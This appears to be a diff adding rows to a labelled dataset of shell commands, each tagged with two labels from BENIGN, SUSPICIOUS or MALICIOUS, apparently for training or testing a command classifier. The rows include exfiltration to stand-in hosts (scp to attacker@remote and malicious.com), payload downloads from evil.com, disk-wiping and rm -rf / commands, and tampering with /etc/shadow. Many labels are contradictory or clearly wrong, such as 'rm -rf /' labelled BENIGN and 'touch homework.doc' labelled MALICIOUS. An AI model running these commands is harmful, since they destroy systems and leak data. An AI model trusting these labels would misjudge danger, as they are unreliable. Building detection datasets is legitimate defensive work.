+scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
+cat   /var/log/auth.log,SUSPICIOUS,MALICIOUS
+ps aux,MALICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
+ touch homework.doc,SUSPICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+netstat -tulnp,SUSPICIOUS,BENIGN
+watch netstat -an,SUSPICIOUS,MALICIOUS
+sudo apt update,BENIGN,MALICIOUS
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+echo 'owned' > /root/.bashrc,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+cat   welcome.txt,MALICIOUS,BENIGN
+rm   -rf /home/user,SUSPICIOUS,BENIGN
+ps aux,MALICIOUS,BENIGN
+curl   http://unknown.site/script.sh,SUSPICIOUS,BENIGN
+ cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
+chmod 777 /var/log/syslog,MALICIOUS,BENIGN
+chmod 777   /etc/shadow,MALICIOUS,SUSPICIOUS
+which python,SUSPICIOUS,MALICIOUS
+find / -name   'test',SUSPICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,SUSPICIOUS,MALICIOUS
+cd /root/,MALICIOUS,BENIGN
+DD IF=/DEV/ZERO   OF=/DEV/SDA,MALICIOUS,BENIGN
+CAT   /ETC/PASSWD,MALICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+cat readme.md,MALICIOUS,BENIGN
+rm -rf /var/,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
+ls /root/ ,SUSPICIOUS,BENIGN
+echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
+iptables -f,MALICIOUS,BENIGN
+cd   /tmp/,MALICIOUS,BENIGN
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+cat readme.md,SUSPICIOUS,BENIGN
+touch homework.doc,MALICIOUS,BENIGN
+chmod 777 /root/.bashrc,MALICIOUS,SUSPICIOUS
+cd /tmp/,MALICIOUS,SUSPICIOUS
+cat /etc/shadow,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,BENIGN,SUSPICIOUS
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+ping   google.com,MALICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+df -h,MALICIOUS,SUSPICIOUS
+curl   -o http://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
+sudo apt install net-tools,MALICIOUS,BENIGN
+mkdir test,MALICIOUS,SUSPICIOUS
+wget http://fileshare.com/exploit.zip,SUSPICIOUS,MALICIOUS
+curl https://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
+ mkdir test,MALICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+netstat -tulnp,BENIGN,MALICIOUS
+echo 'hello',SUSPICIOUS,BENIGN
+wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+curl -O http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+sudo apt update,SUSPICIOUS,BENIGN
+ping google.com,BENIGN,SUSPICIOUS
+sudo su,SUSPICIOUS,BENIGN
+touch homework.doc,MALICIOUS,BENIGN
+top -n 1,SUSPICIOUS,BENIGN
+ ps aux,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,BENIGN,MALICIOUS
+cat welcome.txt,SUSPICIOUS,BENIGN
+cat   welcome.txt,MALICIOUS,BENIGN
+cat   /root/.bashrc,SUSPICIOUS,MALICIOUS
+cat /etc/shadow,SUSPICIOUS,BENIGN
+cat   /etc/passwd,BENIGN,SUSPICIOUS
+sudo -l,SUSPICIOUS,BENIGN
+ping google.com,BENIGN,SUSPICIOUS
+rm -rf /var/ ,BENIGN,SUSPICIOUS
+find / -name 'test',MALICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
+CAT /HOME/USER/INFO.TXT,MALICIOUS,BENIGN
+ls   /var/www,SUSPICIOUS,BENIGN
+curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
+ifconfig,BENIGN,SUSPICIOUS
+echo 'hello world',MALICIOUS,BENIGN
+ifconfig,MALICIOUS,SUSPICIOUS
+chmod 777 /var/log/syslog,SUSPICIOUS,BENIGN
+cat /etc/shadow,BENIGN,MALICIOUS
+CURL -O HTTP://FILESHARE.COM/UPDATE.BIN,MALICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,BENIGN
+pwd,SUSPICIOUS,MALICIOUS
+ls /root/,MALICIOUS,BENIGN
+iptables -F,MALICIOUS,BENIGN
+chmod 777 /root/.bashrc,SUSPICIOUS,BENIGN
+ifconfig,MALICIOUS,BENIGN
+echo 'owned' >> /etc/shadow,MALICIOUS,BENIGN
+echo 'owned'   >> /etc/shadow,MALICIOUS,BENIGN
+echo 'hello world',MALICIOUS,SUSPICIOUS
+env,BENIGN,SUSPICIOUS
+TOP -N 1,SUSPICIOUS,BENIGN
+NETSTAT -TULNP ,SUSPICIOUS,BENIGN
+pwd,MALICIOUS,BENIGN
+curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
+rm -rf /* --no-preserve-root,MALICIOUS,SUSPICIOUS
+find / -name   'test',MALICIOUS,BENIGN
+mkdir   test,MALICIOUS,BENIGN
+history,SUSPICIOUS,MALICIOUS
+curl https://suspicious.org/exploit.zip,MALICIOUS,BENIGN
+mv   /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+curl -O http://suspicious.org/payload.sh,MALICIOUS,BENIGN
+uname -a,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+sudo apt install nmap,MALICIOUS,BENIGN
+cat welcome.txt,SUSPICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+cd /root,SUSPICIOUS,BENIGN
+du   -sh,MALICIOUS,BENIGN
+top -n 1,SUSPICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+wget http://evil.com/payload.sh,SUSPICIOUS,MALICIOUS
+ls -al,MALICIOUS,BENIGN
+cat welcome.txt,SUSPICIOUS,BENIGN
+echo   'owned' >> /var/log/syslog,BENIGN,MALICIOUS
+ls /tmp/,MALICIOUS,BENIGN
+cat   /home/user/info.txt,SUSPICIOUS,BENIGN
+scp backup.sql user@malicious.com:/tmp/,MALICIOUS,BENIGN
+ netstat -tulnp,MALICIOUS,BENIGN
+DD IF=/DEV/ZERO OF=/DEV/SDA,SUSPICIOUS,BENIGN
+sudo su,SUSPICIOUS,BENIGN
+cat notes.txt,BENIGN,MALICIOUS
+echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
+iptables -F,SUSPICIOUS,BENIGN
+cat   /var/log/syslog,MALICIOUS,BENIGN
+MKDIR TEST,SUSPICIOUS,BENIGN
+mkdir test,SUSPICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
+ENV,MALICIOUS,BENIGN
+history,BENIGN,MALICIOUS
+sudo apt install htop,MALICIOUS,BENIGN
+history,SUSPICIOUS,BENIGN
+which python,SUSPICIOUS,BENIGN
+which python,SUSPICIOUS,BENIGN
+wget http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
+cat homework.txt,SUSPICIOUS,BENIGN
+PING GOOGLE.COM,MALICIOUS,SUSPICIOUS
+echo   'hello world',SUSPICIOUS,BENIGN
+cat /var/log/auth.log,SUSPICIOUS,MALICIOUS
+rm -rf /var/,SUSPICIOUS,BENIGN
+scp file.txt user@malicious.com:/tmp/,SUSPICIOUS,BENIGN
+grep 'password' /etc/passwd,MALICIOUS,BENIGN
+cat /etc/passwd ,MALICIOUS,BENIGN
+cat welcome.txt,BENIGN,MALICIOUS
+WGET HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,MALICIOUS,BENIGN
+cat homework.txt,SUSPICIOUS,BENIGN
+echo 'pwned' > /etc/shadow,MALICIOUS,BENIGN
+which python,MALICIOUS,BENIGN
+DF -H ,MALICIOUS,BENIGN
+iptables -F ,MALICIOUS,BENIGN
+ECHO 'OWNED' >   /ETC/SHADOW,SUSPICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+df -h,SUSPICIOUS,BENIGN
+cat notes.txt,SUSPICIOUS,BENIGN
+ rm -rf /home/user,SUSPICIOUS,BENIGN
+top -n 1,BENIGN,MALICIOUS
+echo 'owned' >> /var/log/syslog,BENIGN,MALICIOUS
+rm -rf /var/,BENIGN,SUSPICIOUS
+mv /bin/bash /tmp/bash ,MALICIOUS,BENIGN
+curl -O http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
+cat /var/log/auth.log,MALICIOUS,BENIGN
+cat homework.txt,SUSPICIOUS,BENIGN
+sudo apt install nmap,MALICIOUS,SUSPICIOUS
+sudo apt install net-tools,SUSPICIOUS,MALICIOUS
+cat /var/log/auth.log,MALICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
+echo 'hacked' >> /etc/shadow,SUSPICIOUS,BENIGN
+scp   file.txt admin@192.168.0.2:/root/,BENIGN,SUSPICIOUS
+grep 'password' /etc/passwd,MALICIOUS,BENIGN
+CAT NOTES.TXT,MALICIOUS,BENIGN
+cat ~/.ssh/known_hosts,BENIGN,SUSPICIOUS
+chmod 777 /var/log/syslog,MALICIOUS,BENIGN
+curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
+ECHO 'HACKED' >> /ROOT/.BASHRC,MALICIOUS,BENIGN
+ls   /root/,SUSPICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,BENIGN,MALICIOUS
+chmod 777 /var/log/syslog,SUSPICIOUS,BENIGN
+whoami,SUSPICIOUS,BENIGN
+netstat   -tulnp,MALICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+curl -O http://evil.com/update.bin,SUSPICIOUS,BENIGN
+grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
+cat   homework.txt,SUSPICIOUS,BENIGN
+curl   https://evil.com/payload.sh,SUSPICIOUS,MALICIOUS
+ssh -L 8080:target.com:80   attacker@remote,SUSPICIOUS,BENIGN
+cd /root,MALICIOUS,SUSPICIOUS
+grep 'password' /etc/passwd ,MALICIOUS,BENIGN
+echo   'hacked' > /var/log/syslog,MALICIOUS,BENIGN
+top -n 1,SUSPICIOUS,MALICIOUS
+cat   /var/log/auth.log,MALICIOUS,BENIGN
+curl -o   http://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
+ifconfig,MALICIOUS,SUSPICIOUS
+dd if=/dev/zero of=/dev/sda,BENIGN,SUSPICIOUS
+grep   root /etc/passwd,MALICIOUS,BENIGN
+LS /VAR/WWW,SUSPICIOUS,BENIGN
+find / -name 'test',SUSPICIOUS,BENIGN
+ping google.com,BENIGN,SUSPICIOUS
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+watch netstat -an,MALICIOUS,BENIGN
+df -h,SUSPICIOUS,BENIGN
+df -h,MALICIOUS,BENIGN
+cat   .bashrc,MALICIOUS,BENIGN
+wget http://fileshare.com/update.bin ,BENIGN,MALICIOUS
+sudo -l,MALICIOUS,BENIGN
+cd /tmp/,MALICIOUS,BENIGN
+curl -O http://fileshare.com/update.bin,MALICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+ifconfig,SUSPICIOUS,MALICIOUS
+cat /var/log/auth.log,MALICIOUS,BENIGN
+WHOAMI,BENIGN,SUSPICIOUS
+cat notes.txt ,SUSPICIOUS,BENIGN
+rm -rf /var/,MALICIOUS,BENIGN
+ping google.com,MALICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
+wget http://malicious.com/payload.sh,MALICIOUS,SUSPICIOUS
+uname -a,MALICIOUS,SUSPICIOUS
+netstat -tulnp,SUSPICIOUS,BENIGN
+cat homework.txt,MALICIOUS,BENIGN
+ cat welcome.txt,BENIGN,SUSPICIOUS
+ sudo -l,SUSPICIOUS,MALICIOUS
+echo 'hello',SUSPICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+cd /var/www,MALICIOUS,BENIGN
+WHICH   PYTHON,BENIGN,SUSPICIOUS
+echo 'hacked' > /var/log/syslog,SUSPICIOUS,BENIGN
+history,MALICIOUS,BENIGN
+cat welcome.txt,BENIGN,MALICIOUS
+whoami ,SUSPICIOUS,BENIGN
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+find / -name 'test',MALICIOUS,BENIGN
+which   python,SUSPICIOUS,MALICIOUS
+cat /home/user/info.txt,MALICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
+cat   ~/.ssh/known_hosts,BENIGN,SUSPICIOUS
+cat notes.txt,MALICIOUS,BENIGN
+echo 'pwned' > /root/.bashrc,MALICIOUS,BENIGN
+curl -O http://evil.com/exploit.zip,MALICIOUS,BENIGN
+sudo apt install htop,MALICIOUS,SUSPICIOUS
+cd /root/,BENIGN,MALICIOUS
+sudo apt   install htop,MALICIOUS,BENIGN
+echo   'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+echo 'hello world',MALICIOUS,BENIGN
+mkdir test,SUSPICIOUS,BENIGN
+wget http://malicious.com/payload.sh,BENIGN,MALICIOUS
+cat /root/.bashrc,BENIGN,MALICIOUS
+scp data.tar.gz user@backup.server:/var/www,SUSPICIOUS,MALICIOUS
+RM -RF   /HOME/USER,SUSPICIOUS,BENIGN
+curl https://suspicious.org/update.bin,MALICIOUS,BENIGN
+ cat /var/log/auth.log,MALICIOUS,BENIGN
+curl https://suspicious.org/update.bin,BENIGN,SUSPICIOUS
+cat /etc/shadow,SUSPICIOUS,BENIGN
+SUDO APT INSTALL HTOP,MALICIOUS,BENIGN
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+cat /etc/passwd,SUSPICIOUS,MALICIOUS
+ps aux ,SUSPICIOUS,BENIGN
+ grep root /etc/passwd,SUSPICIOUS,BENIGN
+CD /ROOT/,SUSPICIOUS,BENIGN
+env,SUSPICIOUS,BENIGN
+cd /var/www,SUSPICIOUS,BENIGN
+ ps aux,SUSPICIOUS,BENIGN
+ WATCH NETSTAT -AN,SUSPICIOUS,MALICIOUS
+top -n 1,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+echo 'pwned' > /root/.bashrc ,BENIGN,MALICIOUS
+cat /etc/passwd,SUSPICIOUS,BENIGN
+ifconfig ,SUSPICIOUS,MALICIOUS
+cd /root ,MALICIOUS,BENIGN
+ ping google.com,SUSPICIOUS,BENIGN
+watch netstat -an,SUSPICIOUS,BENIGN
+mkdir test,MALICIOUS,BENIGN
+ping google.com,SUSPICIOUS,BENIGN
+cat   /var/log/syslog,MALICIOUS,BENIGN
+wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+top -n 1,SUSPICIOUS,BENIGN
+sudo su,SUSPICIOUS,BENIGN
+cd /var/www,SUSPICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+ssh -L   8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+find / -name 'test' ,SUSPICIOUS,MALICIOUS
+curl -O http://malicious.com/malware.bin,BENIGN,SUSPICIOUS
+grep root /etc/passwd,SUSPICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+scp data.tar.gz root@malicious.com:/var/www,MALICIOUS,BENIGN
+top   -n 1,MALICIOUS,BENIGN
+scp data.tar.gz root@192.168.0.2:/root/,SUSPICIOUS,BENIGN
+echo 'hello world',MALICIOUS,BENIGN
+ cat /home/user/todo.txt,SUSPICIOUS,BENIGN
+df -h,MALICIOUS,BENIGN
+which python,MALICIOUS,BENIGN
+echo 'pwned' >> /var/log/syslog,MALICIOUS,BENIGN
+wget http://evil.com/payload.sh,MALICIOUS,SUSPICIOUS
+touch   homework.doc,MALICIOUS,BENIGN
+cat readme.md,MALICIOUS,BENIGN
+LS /VAR/WWW,MALICIOUS,BENIGN
+touch homework.doc,SUSPICIOUS,BENIGN
+chmod 777 /var/log/syslog,MALICIOUS,BENIGN
+ sudo apt install htop,MALICIOUS,BENIGN
+chmod 777 /root/.bashrc,SUSPICIOUS,MALICIOUS
+WGET HTTP://MALICIOUS.COM/PAYLOAD.SH,MALICIOUS,BENIGN
+history,SUSPICIOUS,BENIGN
+curl https://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
+CURL HTTP://UNKNOWN.SITE/SCRIPT.SH ,SUSPICIOUS,BENIGN
+cat /home/user/todo.txt,MALICIOUS,BENIGN
+chmod 777 /var/log/syslog,MALICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+netstat -tulnp,MALICIOUS,BENIGN
+cd /tmp/ ,MALICIOUS,BENIGN
+echo 'hello   world',BENIGN,SUSPICIOUS
+echo 'hacked' >   /root/.bashrc,BENIGN,MALICIOUS
+ps aux | grep sshd,SUSPICIOUS,BENIGN
+curl https://fileshare.com/payload.sh,MALICIOUS,BENIGN
+cat /etc/shadow,SUSPICIOUS,BENIGN
+ curl -o http://evil.com/exploit.zip,SUSPICIOUS,MALICIOUS
+ps aux |   grep nginx,MALICIOUS,BENIGN
+ping google.com,SUSPICIOUS,BENIGN
+ du -sh,MALICIOUS,BENIGN
+cat   /var/log/syslog,MALICIOUS,BENIGN
+scp backup.sql user@malicious.com:/root/,MALICIOUS,BENIGN
+sudo apt update,SUSPICIOUS,BENIGN
+cat /etc/passwd,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,BENIGN,MALICIOUS
+scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
+ls /root/,SUSPICIOUS,BENIGN
+cat /var/log/auth.log,SUSPICIOUS,BENIGN
+echo 'malware' >   /tmp/malware.sh,SUSPICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,MALICIOUS,SUSPICIOUS
+cd /var/www,SUSPICIOUS,BENIGN
+echo 'owned' >> /var/log/syslog,MALICIOUS,SUSPICIOUS
+cat welcome.txt,SUSPICIOUS,BENIGN
+mkdir test,SUSPICIOUS,BENIGN
+mv /bin/bash   /tmp/bash,SUSPICIOUS,BENIGN
+cd /root/,SUSPICIOUS,BENIGN
+rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
+which python,MALICIOUS,BENIGN
+TOP -N 1 ,BENIGN,SUSPICIOUS
+pwd,BENIGN,MALICIOUS
+cat notes.txt,SUSPICIOUS,BENIGN
+curl -O http://evil.com/exploit.zip,SUSPICIOUS,BENIGN
+mkdir   test,MALICIOUS,BENIGN
+chmod 777 /root/.bashrc,SUSPICIOUS,BENIGN
+grep root /etc/passwd,SUSPICIOUS,BENIGN
+cd /root,MALICIOUS,BENIGN
+cd /tmp/,MALICIOUS,BENIGN
+ls /tmp/,MALICIOUS,BENIGN
+curl -O http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+ls -al,MALICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
+ls -al,SUSPICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,SUSPICIOUS
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+cd /root,MALICIOUS,BENIGN
+scp   backup.sql admin@malicious.com:/tmp/,MALICIOUS,BENIGN
+sudo su,SUSPICIOUS,BENIGN
+sudo apt install net-tools,BENIGN,MALICIOUS
+curl -O http://fileshare.com/payload.sh,BENIGN,SUSPICIOUS
+ps aux | grep nginx,SUSPICIOUS,BENIGN
+cat   .bashrc,SUSPICIOUS,BENIGN
+cat /etc/shadow,BENIGN,SUSPICIOUS
+df -h,SUSPICIOUS,MALICIOUS
+chmod 777 /root/.bashrc,BENIGN,MALICIOUS
+sudo apt install net-tools,BENIGN,SUSPICIOUS
+pwd,SUSPICIOUS,BENIGN
+echo 'pwned' > /etc/shadow,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
+ls /tmp/,MALICIOUS,BENIGN
+cd /tmp/,MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
+cat welcome.txt,SUSPICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,BENIGN
+wget   http://malicious.com/payload.sh,MALICIOUS,BENIGN
+top -n 1,BENIGN,MALICIOUS
+echo 'hello world',SUSPICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+wget http://evil.com/payload.sh,MALICIOUS,BENIGN
+curl https://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
+ cat readme.md,MALICIOUS,BENIGN
+wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
+curl https://evil.com/payload.sh,BENIGN,MALICIOUS
+mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
+find / -name 'test',MALICIOUS,BENIGN
+echo 'hacked' >> /root/.bashrc,MALICIOUS,BENIGN
+ps aux | grep sshd,SUSPICIOUS,BENIGN
+ls /root/,BENIGN,MALICIOUS
+whoami,BENIGN,SUSPICIOUS
+scp data.tar.gz user@malicious.com:/tmp/,BENIGN,SUSPICIOUS
+ps aux | grep sshd,MALICIOUS,BENIGN
+cat /etc/shadow,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+ cat welcome.txt,SUSPICIOUS,BENIGN
+touch homework.doc,MALICIOUS,BENIGN
+sudo apt install net-tools,MALICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+cat /var/log/auth.log,SUSPICIOUS,BENIGN
+history,BENIGN,MALICIOUS
+grep   'password' /etc/passwd,SUSPICIOUS,BENIGN
+ls /var/www ,SUSPICIOUS,BENIGN
+which python,BENIGN,SUSPICIOUS
+echo 'hello',MALICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
+CAT   /HOME/USER/INFO.TXT,BENIGN,SUSPICIOUS
+sudo apt update,MALICIOUS,BENIGN
+curl https://evil.com/exploit.zip,SUSPICIOUS,MALICIOUS
+LS /VAR/WWW ,BENIGN,MALICIOUS
+chmod 777   /root/.bashrc,MALICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+ifconfig,MALICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,BENIGN
+ scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+ ls /var/www,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
+ls -al,MALICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,BENIGN,SUSPICIOUS
+curl https://safe-site.org/update.sh ,MALICIOUS,SUSPICIOUS
+watch netstat -an,BENIGN,MALICIOUS
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+uname -a,BENIGN,SUSPICIOUS
+top -n 1,SUSPICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+sudo apt install net-tools,MALICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+find / -name 'test' ,BENIGN,SUSPICIOUS
+netstat -tulnp,MALICIOUS,SUSPICIOUS
+pwd,BENIGN,SUSPICIOUS
+curl   https://safe-site.org/update.sh,BENIGN,MALICIOUS
+ps aux | grep sshd ,MALICIOUS,BENIGN
+dd   if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+sudo apt   install nmap,SUSPICIOUS,BENIGN
+netstat   -tulnp,MALICIOUS,BENIGN
+sudo apt install htop,SUSPICIOUS,BENIGN
+ps aux | grep mysql,SUSPICIOUS,BENIGN
+wget http://fileshare.com/exploit.zip,MALICIOUS,BENIGN
+CURL   HTTPS://SUSPICIOUS.ORG/UPDATE.BIN,SUSPICIOUS,BENIGN
+ wget http://evil.com/update.bin,SUSPICIOUS,BENIGN
+echo 'hello world',MALICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+wget http://malicious.com/payload.sh,BENIGN,MALICIOUS
+cat readme.md,MALICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,SUSPICIOUS
+curl -o http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,BENIGN
+whoami,MALICIOUS,BENIGN
+ whoami,BENIGN,SUSPICIOUS
+ls   /root/,MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
+netstat -tulnp,SUSPICIOUS,BENIGN
+SCP FILE.TXT USER@BACKUP.SERVER:/VAR/WWW ,MALICIOUS,BENIGN
+grep root /etc/passwd,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,MALICIOUS
+cat /var/log/syslog,MALICIOUS,BENIGN
+rm -rf   /,MALICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+echo 'hacked' > /var/log/syslog,SUSPICIOUS,BENIGN
+cat homework.txt ,SUSPICIOUS,BENIGN
+cat .bashrc,SUSPICIOUS,BENIGN
+scp data.tar.gz   admin@malicious.com:/root/,MALICIOUS,BENIGN
+ps aux,MALICIOUS,BENIGN
+cd /tmp/,MALICIOUS,BENIGN
+curl https://fileshare.com/exploit.zip,BENIGN,MALICIOUS
+cd /var/www,BENIGN,SUSPICIOUS
+history,MALICIOUS,BENIGN
+echo 'pwned' > /etc/shadow,SUSPICIOUS,BENIGN
+curl -O   http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
+echo 'hello world',SUSPICIOUS,BENIGN
+iptables -F,SUSPICIOUS,MALICIOUS
+history ,MALICIOUS,BENIGN
+ifconfig ,MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+HISTORY ,MALICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,BENIGN,MALICIOUS
+rm -rf /home/user,BENIGN,MALICIOUS
+ls /var/www,MALICIOUS,SUSPICIOUS
+cd /tmp/,MALICIOUS,BENIGN
+grep 'password' /etc/passwd,MALICIOUS,BENIGN
+iptables -F,MALICIOUS,SUSPICIOUS
+echo 'owned' > /var/log/syslog,BENIGN,MALICIOUS
+cat /etc/shadow,MALICIOUS,BENIGN
+curl -O   http://fileshare.com/update.bin,MALICIOUS,BENIGN
+rm -rf / ,MALICIOUS,BENIGN
+env,SUSPICIOUS,BENIGN
+ps aux,SUSPICIOUS,BENIGN
+ps aux | grep sshd,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+ls /root/,SUSPICIOUS,BENIGN
+watch netstat -an,MALICIOUS,BENIGN
+iptables -f,MALICIOUS,BENIGN
+curl -O http://evil.com/payload.sh,MALICIOUS,BENIGN
+cd /root/,MALICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,SUSPICIOUS,MALICIOUS
+CHMOD 777 /ETC/SHADOW,SUSPICIOUS,BENIGN
+CURL HTTPS://SUSPICIOUS.ORG/PAYLOAD.SH,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,BENIGN,MALICIOUS
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+sudo -l,MALICIOUS,SUSPICIOUS
+ ps aux | grep nginx,MALICIOUS,BENIGN
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+grep root /etc/passwd,BENIGN,SUSPICIOUS
+which python,SUSPICIOUS,BENIGN
+rm -rf /*   --no-preserve-root,SUSPICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+cd /root,BENIGN,MALICIOUS
+CAT   /ROOT/.BASHRC,MALICIOUS,BENIGN
+curl -O http://suspicious.org/payload.sh,MALICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+ wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+pwd,MALICIOUS,BENIGN
+ echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+wget http://evil.com/update.bin,SUSPICIOUS,BENIGN
+uname -a,SUSPICIOUS,BENIGN
+scp backup.sql   root@192.168.0.2:/root/,SUSPICIOUS,BENIGN
+CURL HTTPS://FILESHARE.COM/UPDATE.BIN,MALICIOUS,BENIGN
+sudo su,SUSPICIOUS,BENIGN
